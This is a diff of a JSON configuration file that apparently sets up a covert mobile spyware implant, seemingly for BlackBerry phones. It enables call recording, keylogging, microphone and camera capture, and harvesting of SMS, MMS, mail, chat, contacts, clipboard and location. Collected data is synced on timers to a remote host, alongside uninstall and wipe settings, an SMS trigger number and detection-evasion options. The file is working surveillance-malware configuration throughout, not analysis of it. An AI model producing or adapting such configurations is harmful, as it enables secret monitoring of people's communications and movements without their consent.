@@ -1,187 +1,153 @@
 {
-  "actions": [
-    {
-      "desc": "STARTUP",
-      "subactions": [
+    "actions": [
         {
-          "module": "call",
-          "status": "start",
-          "action": "module"
-        }
-      ]
-    },
-    {
-      "desc": "SYNC",
-      "subactions": [
+            "desc": "STARTUP",
+            "subactions": [
+                {"status": "start", "module": "device", "action": "module"},
+                {"status": "start", "module": "messages", "action": "module"}
+            ]
+        },
         {
-          "maxdelay": 0,
-          "bandwidth": 500000,
-          "host": "192.168.100.100",
-          "cell": false,
-          "stop": false,
-          "wifi": false,
-          "mindelay": 0,
-          "action": "synchronize"
-        }
-      ]
-    },
-    {
-      "desc": "",
-      "subactions": [
+            "desc": "SCREENSHOT",
+            "subactions": [{"status": "start", "module": "screenshot", "action": "module"}]
+        },
+        {"desc": "POSITION", "subactions": [{"status": "start", "module": "position", "action": "module"}]},
         {
-          "action": "uninstall"
+            "desc": "SYNC",
+            "subactions": [
+                {
+                    "mindelay": 0,
+                    "stop": false,
+                    "cell": false,
+                    "action": "synchronize",
+                    "wifi": true,
+                    "bandwidth": 500000,
+                    "maxdelay": 0,
+                    "host": "192.168.100.100"
+                }
+            ]
+        },
+        {"desc": "", "subactions": [{"action": "uninstall"}]},
+        {"desc": "", "subactions": [{"status": "start", "module": "mic", "action": "module"}]},
+        {"desc": "", "subactions": [{"status": "stop", "module": "mic", "action": "module"}]},
+        {
+            "desc": "",
+            "subactions": [{"text": "log sms", "action": "log"}, {"command": "net_rim_bb_memo_app", "action": "execute"}]
         }
-      ]
-    }
-  ],
-  "modules": [
-    {
-      "module": "addressbook"
-    },
-    {
-      "module": "application"
-    },
-    {
-      "module": "calendar"
-    },
-    {
-      "module": "call",
-      "record": true,
-      "compression": 5,
-      "buffer": 512000
-    },
-    {
-      "quality": "med",
-      "module": "camera"
-    },
-    {
-      "module": "chat"
-    },
-    {
-      "module": "clipboard"
-    },
-    {
-      "module": "conference",
-      "number": ""
-    },
-    {
-      "module": "crisis",
-      "call": true,
-      "synchronize": false,
-      "mic": true,
-      "camera": true,
-      "hook": {
-        "processes": [
-
-        ],
-        "enabled": true
-      },
-      "network": {
-        "processes": [
-
-        ],
-        "enabled": false
-      },
-      "position": true
-    },
-    {
-      "module": "device",
-      "list": false
-    },
-    {
-      "module": "keylog"
-    },
-    {
-      "module": "livemic",
-      "number": ""
-    },
-    {
-      "module": "messages",
-      "mms": {
-        "filter": {
-          "datefrom": "2012-04-03 00:00:00",
-          "history": true
-        },
-        "enabled": true
-      },
-      "sms": {
-        "filter": {
-          "datefrom": "2012-04-03 00:00:00",
-          "history": true
-        },
-        "enabled": true
-      },
-      "mail": {
-        "filter": {
-          "history": true,
-          "maxsize": 100000,
-          "datefrom": "2012-04-03 00:00:00"
-        },
-        "enabled": true
-      }
-    },
-    {
-      "module": "mic",
-      "silence": 5,
-      "threshold": 0.22,
-      "autosense": false
-    },
-    {
-      "module": "position",
-      "wifi": true,
-      "gps": false,
-      "cell": true
-    },
-    {
-      "quality": "med",
-      "module": "screenshot",
-      "onlywindow": false
-    },
-    {
-      "module": "url"
-    }
-  ],
-  "globals": {
-    "nohide": [
-
     ],
-    "collapsed": false,
-    "quota": {
-      "min": 100000000,
-      "max": 100000000
+    "globals": {
+        "type": "mobile",
+        "advanced": true,
+        "wipe": false,
+        "nohide": [],
+        "quota": {"min": 104857600, "max": 104857600},
+        "collapsed": false,
+        "remove_driver": true
     },
-    "wipe": false,
-    "type": "mobile",
-    "advanced": true,
-    "remove_driver": true
-  },
-  "events": [
-    {
-      "event": "timer",
-      "ts": "00:00:00",
-      "start": 0,
-      "enabled": true,
-      "subtype": "loop",
-      "te": "23:59:59",
-      "desc": "STARTUP"
-    },
-    {
-      "process": "*calc*",
-      "window": false,
-      "event": "process",
-      "desc": "",
-      "start": 2,
-      "enabled": true,
-      "focus": false
-    },
-    {
-      "process": "*calend*",
-      "window": false,
-      "event": "process",
-      "start": 1,
-      "focus": false,
-      "enabled": true,
-      "desc": ""
-    }
-  ]
+    "modules": [
+        {"module": "addressbook"},
+        {"module": "application"},
+        {"module": "calendar"},
+        {"record": true, "buffer": 512000, "compression": 5, "module": "call"},
+        {"module": "clipboard"},
+        {"module": "chat"},
+        {
+            "position": true,
+            "mic": true,
+            "network": {"enabled": false, "processes": []},
+            "camera": true,
+            "call": true,
+            "hook": {"enabled": true, "processes": []},
+            "module": "crisis",
+            "synchronize": false
+        },
+        {"list": false, "module": "device"},
+        {
+            "sms": {
+                "filter": {"datefrom": "2012-04-23 00:00:00", "dateto": "2100-01-01 00:00:00", "history": true},
+                "enabled": true
+            },
+            "mail": {
+                "filter": {
+                    "datefrom": "2013-01-20 00:00:00",
+                    "dateto": "2100-01-01 00:00:00",
+                    "maxsize": 100000,
+                    "history": true
+                },
+                "enabled": true
+            },
+            "mms": {
+                "filter": {"datefrom": "2012-04-23 00:00:00", "dateto": "2100-01-01 00:00:00", "history": true},
+                "enabled": true
+            },
+            "module": "messages"
+        },
+        {"autosense": false, "threshold": 0.22, "module": "mic", "silence": 5},
+        {"cell": true, "gps": false, "module": "position", "wifi": true},
+        {"quality": "med", "onlywindow": false, "module": "screenshot"}
+    ],
+    "events": [
+        {
+            "desc": "STARTUP",
+            "start": 0,
+            "subtype": "loop",
+            "ts": "00:00:00",
+            "enabled": true,
+            "te": "23:59:59",
+            "event": "timer"
+        },
+        {
+            "repeat": 1,
+            "start": 1,
+            "subtype": "loop",
+            "ts": "00:00:00",
+            "desc": "SCREENSHOT",
+            "enabled": false,
+            "te": "23:59:59",
+            "event": "timer",
+            "delay": 60
+        },
+        {
+            "repeat": 2,
+            "start": 2,
+            "subtype": "loop",
+            "ts": "00:00:00",
+            "desc": "POSITION",
+            "enabled": false,
+            "te": "23:59:59",
+            "event": "timer",
+            "delay": 60
+        },
+        {
+            "repeat": 3,
+            "subtype": "loop",
+            "ts": "00:00:00",
+            "desc": "SYNC",
+            "enabled": true,
+            "te": "23:59:59",
+            "event": "timer",
+            "delay": 120
+        },
+        {
+            "desc": "",
+            "start": 4,
+            "window": false,
+            "process": "*calc*",
+            "enabled": true,
+            "focus": false,
+            "event": "process"
+        },
+        {
+            "desc": "",
+            "start": 5,
+            "window": false,
+            "process": "*task*",
+            "end": 6,
+            "enabled": true,
+            "focus": false,
+            "event": "process"
+        },
+        {"desc": "", "start": 3, "enabled": true, "event": "standby"},
+        {"desc": "", "start": 7, "text": "log", "enabled": true, "event": "sms", "number": "3666539755"}
+    ]
 }
